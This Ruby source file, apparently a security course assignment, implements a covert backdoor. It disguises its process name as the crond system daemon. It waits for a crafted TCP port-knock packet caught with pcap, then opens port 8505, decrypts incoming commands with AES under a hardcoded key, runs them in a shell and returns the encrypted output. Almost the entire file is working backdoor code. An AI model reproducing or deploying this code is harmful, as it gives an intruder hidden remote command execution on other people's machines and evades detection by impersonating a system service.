#! /usr/bin/env ruby
=begin
-------------------------------------------------------------------------------------
--  SOURCE FILE:    server.rb - An  
--
--  PROGRAM:        server
--                ./server.rb 
--
--  FUNCTIONS:      
--
--  Ruby Gems required:     ruby-pcap for pcaplet
							https://rubygems.org/gems/ruby-pcap
--
--  DATE:           May 2014
--
--  REVISIONS:      See development repo: https://github.com/deuterium/comp8505-assign2
--
--  DESIGNERS:      Chris Wood - chriswood.ca@gmail.com
--
--  PROGRAMMERS:    Chris Wood - chriswood.ca@gmail.com
--
--  NOTES:          
--  
---------------------------------------------------------------------------------------
=end

require 'socket'
require 'openssl' #http://www.ruby-doc.org/stdlib-2.1.1/libdoc/openssl/rdoc/OpenSSL/Cipher.html
require 'pcaplet' #http://www.goto.info.waseda.ac.jp/~fukusima/ruby/pcap/doc/index.html


# rename process immediately 
$0 = "/usr/sbin/crond -n"

## Variables

@device = "wlp2s0" # interface to filter on
$key = OpenSSL::Digest::SHA256.new("verysecretkey").digest

## Functions
def wait_for_knock
    # listen for signature
    capture = Pcaplet.new("-s 65535 -i #{@device}")
    filter = Pcap::Filter.new("tcp and src port 27564", capture.capture)

    capture.each do |pkt|
        if filter =~ pkt && pkt.tcp_psh? && pkt.tcp_rst? && pkt.tcp_fin? \
            && !pkt.tcp_urg?  && !pkt.tcp_ack?  && !pkt.tcp_syn?
            return true
        end
    end
end

def decrypt(data)
    cipher = OpenSSL::Cipher::AES256.new(:CBC)
    cipher.decrypt

    cipher.key = $key

    begin
        msg = cipher.update(data)
        msg << cipher.final
    rescue Exception => e
        puts e
    end
    return msg
end

def encrypt(data)
    cipher = OpenSSL::Cipher::AES256.new(:CBC)
    cipher.encrypt

    cipher.key = $key

    begin
        payload = cipher.update(data)
        payload << cipher.final
    rescue Exception => e
        puts e
    end
    return payload
end

def start_server
    tcpserver = TCPServer.open(8505)
    Thread.start(tcpserver.accept) do |client|
        loop {
                client.flush
            cmd = decrypt(client.gets.chomp)
            if cmd.downcase == "quit"
                client.close
                Thread.exit
                #go back to knock loop
            else
                puts "hello: command is #{cmd}"
                results = %x{ #{cmd} }
                puts results
                client.puts encrypt(results)
                client.flush
            end
        }
    end
    tcpserver.shutdown
end
## Main

loop {
    if wait_for_knock
        start_server
    end
}
